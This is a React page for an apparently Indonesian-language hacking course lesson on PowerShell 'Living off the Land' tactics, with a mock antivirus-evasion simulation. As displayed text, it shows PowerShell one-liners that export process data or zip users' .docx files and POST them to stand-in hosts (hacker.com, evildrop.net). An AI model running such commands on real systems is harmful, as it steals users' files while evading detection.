import React, { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Link } from 'react-router-dom';
import { ChevronRight, ChevronLeft, ShieldAlert, ShieldCheck, TerminalSquare, Download, AlertTriangle, ShieldX, Ghost, Terminal } from 'lucide-react';

const PowerShellWindows = () => {
  const [simulationState, setSimulationState] = useState('idle'); // 'idle', 'virus_blocked', 'ps_stealth'

  const handleDownloadVirus = () => {
    setSimulationState('virus_blocked');
    setTimeout(() => setSimulationState('idle'), 3500);
  };

  const handleRunPowerShell = () => {
    setSimulationState('ps_stealth');
    setTimeout(() => setSimulationState('idle'), 5000);
  };

  return (
    <div className="min-h-screen bg-gray-950 text-gray-300 font-mono p-6 md:p-12">
      <div className="max-w-6xl mx-auto">
        
        {/* Header */}
        <motion.div 
          initial={{ opacity: 0, y: -20 }}
          animate={{ opacity: 1, y: 0 }}
          className="flex items-center gap-4 mb-12 border-b border-blue-900/30 pb-6 pl-0 md:pl-32"
        >
          <div className="p-3 bg-blue-500/10 rounded-lg border border-blue-500/50">
            <TerminalSquare className="w-8 h-8 text-blue-400" />
          </div>
          <div>
            <h1 className="text-sm text-blue-400 tracking-[0.3em] uppercase font-black">Stage 6 · Modul 3: Bash & PowerShell Scripting</h1>
            <h2 className="text-3xl font-black text-white italic tracking-tighter uppercase">
              POWERSHELL: SI KUDA HITAM
            </h2>
          </div>
        </motion.div>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-16 items-start">
          
          {/* Left Column: Content */}
          <motion.div 
            initial={{ opacity: 0, x: -20 }}
            animate={{ opacity: 1, x: 0 }}
            className="space-y-8"
          >
            <section>
              <h1 className="text-4xl font-black text-white italic tracking-tighter uppercase mb-6 leading-tight">
                Living Off <br/>
                <span className="text-blue-500" style={{ textShadow: '0 0 10px rgba(59, 130, 246, 0.5)' }}>THE LAND (LOTL)</span>
              </h1>
              <p className="text-gray-400 leading-relaxed text-base">
                PowerShell adalah rajanya kalau lo mau nge-hack jaringan kantoran (yang mayoritas pakai Windows). Kenapa?
              </p>
            </section>

            <div className="space-y-6 text-sm leading-relaxed text-gray-400">
               <p>
                 Karena beda sama Python atau Go yang harus di-install dulu, PowerShell itu <span className="text-white font-bold bg-blue-900/50 px-2 py-0.5 rounded">udah bawaan (default)</span> di semua sistem operasi Windows modern.
               </p>
               
               <p>
                 Hacker tingkat dewa pake taktik yang namanya <strong className="text-white uppercase tracking-widest text-blue-400">"Living off the Land" (LOTL)</strong>.
               </p>

               <ul className="space-y-4">
                  <li className="flex items-start gap-4 p-4 bg-gray-900 border border-gray-800 rounded-xl">
                     <div className="p-2 bg-gray-950/30 rounded border border-gray-500/30 text-gray-400">
                        <Ghost className="w-5 h-5"/>
                     </div>
                     <div className="flex-1 text-xs">
                        <span className="text-gray-300 font-bold uppercase tracking-widest block mb-1">Menyamar Jadi Admin</span>
                        Nyerang nggak pake virus buatan sendiri, tapi pake <span className="text-white italic">tools resmi bawaan sistem operasi</span> itu sendiri!
                     </div>
                  </li>
               </ul>

               <div className="p-6 bg-blue-900/10 border-l-4 border-blue-500 space-y-2 rounded-r-xl shadow-lg mt-8">
                  <div className="flex items-center gap-3 mb-2">
                     <ShieldAlert className="w-5 h-5 text-blue-400" />
                     <p className="text-white font-black italic uppercase tracking-widest text-[10px]">Reaksi Antivirus:</p>
                  </div>
                  <p className="italic text-gray-300 text-xs leading-relaxed font-bold">
                    "Antivirus jadi bingung, 'Ini aksi virus beneran atau emang Admin IT-nya lagi kerja pakai PowerShell?'. Hacker nyolong data persis di depan hidung Windows Defender cuma bermodalkan script PowerShell!"
                  </p>
               </div>
            </div>
          </motion.div>

          {/* Right Column: Interaction */}
          <div className="sticky top-12">
            <div className="p-8 border-2 border-blue-500/30 bg-gray-900/50 rounded-xl relative overflow-hidden flex flex-col shadow-2xl transition-colors duration-500">
              
              <div className="mb-6 text-center relative z-20 flex flex-col items-center">
                 <h2 className="text-xl font-black text-white italic uppercase tracking-tighter">SIMULASI: EVASION ANTIVIRUS</h2>
                 <p className="text-[9px] text-blue-500 font-bold tracking-[0.2em] mt-1">LIVING_OFF_THE_LAND_TEST</p>
              </div>

              <div className="flex-1 flex flex-col space-y-4 relative z-20 w-full min-h-[350px]">
                 
                 {/* Mock Windows Defender UI */}
                 <div className={`w-full border rounded-xl p-4 flex flex-col items-center justify-center transition-all duration-300 h-[140px] shadow-xl 
                    ${simulationState === 'virus_blocked' ? 'bg-red-950/40 border-red-500' : 'bg-green-950/20 border-green-500'}`}>
                    
                    {simulationState === 'virus_blocked' ? (
                       <motion.div initial={{ scale: 0.8, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} className="flex flex-col items-center gap-2">
                          <ShieldX className="w-12 h-12 text-red-500 animate-pulse drop-shadow-[0_0_15px_rgba(239,68,68,0.8)]" />
                          <h3 className="text-red-400 font-black uppercase tracking-widest text-sm">THREAT BLOCKED!</h3>
                          <p className="text-[10px] text-red-300/70 uppercase">Win32/Trojan_virus.exe berhasil dihapus.</p>
                       </motion.div>
                    ) : (
                       <motion.div initial={{ scale: 0.8, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} className="flex flex-col items-center gap-2">
                          <ShieldCheck className="w-12 h-12 text-green-500 drop-shadow-[0_0_15px_rgba(34,197,94,0.4)]" />
                          <h3 className="text-green-400 font-black uppercase tracking-widest text-sm">YOUR DEVICE IS SECURE</h3>
                          <p className="text-[10px] text-green-300/70 uppercase mb-1">No active threats found.</p>
                          {simulationState === 'ps_stealth' && <span className="text-[8px] bg-blue-900/50 text-blue-300 px-2 py-0.5 rounded border border-blue-500/30 animate-pulse">Running Background process: powershell.exe</span>}
                       </motion.div>
                    )}
                 </div>

                 {/* Action Panel */}
                 <div className="w-full bg-[#0d1117] border border-gray-700 rounded-xl p-6 flex flex-col gap-4 relative overflow-hidden">
                    
                    <button 
                      onClick={handleDownloadVirus}
                      disabled={simulationState !== 'idle'}
                      className="w-full py-4 bg-gray-800 hover:bg-gray-700 border border-gray-600 rounded-xl font-bold text-xs uppercase tracking-widest flex items-center justify-center gap-3 transition-colors text-gray-300 disabled:opacity-50"
                    >
                      <Download className="w-4 h-4" /> Download Malware (virus.exe)
                    </button>
                    
                    <button 
                      onClick={handleRunPowerShell}
                      disabled={simulationState !== 'idle'}
                      className="w-full py-4 bg-blue-900 hover:bg-blue-800 border border-blue-600 rounded-xl font-black text-xs uppercase tracking-widest flex items-center justify-center gap-3 transition-colors text-white shadow-[0_0_10px_rgba(37,99,235,0.4)] disabled:opacity-50"
                    >
                      <Terminal className="w-4 h-4" /> Jalankan Script PowerShell
                    </button>
                    
                    {/* Background PS Action */}
                    <AnimatePresence>
                       {simulationState === 'ps_stealth' && (
                          <motion.div 
                            initial={{ opacity: 0, height: 0, marginTop: 0 }}
                            animate={{ opacity: 1, height: 'auto', marginTop: 8 }}
                            exit={{ opacity: 0, height: 0, marginTop: 0 }}
                            className="bg-black border border-blue-900 p-4 rounded-xl shadow-2xl z-50 overflow-hidden relative"
                          >
                             <div className="flex items-center gap-2 font-mono text-[9px] text-red-500 font-bold mix-blend-screen opacity-80">
                                <span>PS C:\&gt;</span>
                                <span className="typing-effect uppercase">Get-Process | Export-Csv C:\temp\data.txt -NoTypeInformation ; Invoke-WebRequest -Uri http://hacker.com/upload -Method Post -InFile C:\temp\data.txt</span>
                             </div>
                             <p className="text-xs text-white mt-4 font-black italic shadow-black drop-shadow-md">
                                "Hacker nyolong data persis di depan hidung Antivirus, dan Antivirusnya cuma bengong mengira itu perintah sah!"
                             </p>
                          </motion.div>
                       )}
                    </AnimatePresence>

                 </div>

              </div>

              {/* Matrix Glitch PS text behind if stealthing */}
              <AnimatePresence>
                 {simulationState === 'ps_stealth' && (
                    <motion.div 
                      key="stealthBG"
                      initial={{ opacity: 0 }} animate={{ opacity: 0.15 }} exit={{ opacity: 0 }}
                      className="absolute top-28 bottom-0 left-0 right-0 pointer-events-none overflow-hidden z-0 flex flex-col font-mono text-[8px] text-blue-500 leading-none break-all p-4 opacity-40"
                    >
                       Get-ChildItem -Path C:\Users -Recurse -Filter *.docx | Compress-Archive -DestinationPath C:\temp\stolen.zip; Invoke-RestMethod -Uri "https://evildrop.net/recv" -Method Post -InFile C:\temp\stolen.zip...
                       Get-ChildItem -Path C:\Users -Recurse -Filter *.docx | Compress-Archive -DestinationPath C:\temp\stolen.zip; Invoke-RestMethod -Uri "https://evildrop.net/recv" -Method Post -InFile C:\temp\stolen.zip...
                       Get-ChildItem -Path C:\Users -Recurse -Filter *.docx | Compress-Archive -DestinationPath C:\temp\stolen.zip; Invoke-RestMethod -Uri "https://evildrop.net/recv" -Method Post -InFile C:\temp\stolen.zip...
                       Get-ChildItem -Path C:\Users -Recurse -Filter *.docx | Compress-Archive -DestinationPath C:\temp\stolen.zip; Invoke-RestMethod -Uri "https://evildrop.net/recv" -Method Post -InFile C:\temp\stolen.zip...
                    </motion.div>
                 )}
              </AnimatePresence>
              
            </div>
          </div>
        </div>

        {/* Footer Navigation */}
        <div className="flex justify-between items-center mt-12 bg-gray-900 px-8 py-6 rounded-sm border-l-8 border-blue-500 shadow-2xl">
          <Link 
            to="/academy/stage-6/modul-3/bash-linux"
            className="flex items-center gap-2 text-xs font-bold text-gray-500 hover:text-white transition-all group font-black"
          >
            <ChevronLeft className="w-5 h-5 group-hover:-translate-x-1" />
            « SEBELUMNYA
          </Link>
          
          <Link 
            to="/academy/stage-6/modul-3/kesimpulan"
            className="flex items-center gap-3 bg-blue-600 hover:bg-blue-500 text-white hover:text-black px-8 py-4 text-xs font-black transition-all group rounded-sm skew-x-[-12deg]"
          >
            <span className="skew-x-[12deg] flex items-center gap-2 tracking-widest leading-none uppercase">
              SELANJUTNYA » <ChevronRight className="w-4 h-4" />
            </span>
          </Link>
        </div>
      </div>
    </div>
  );
};

export default PowerShellWindows;
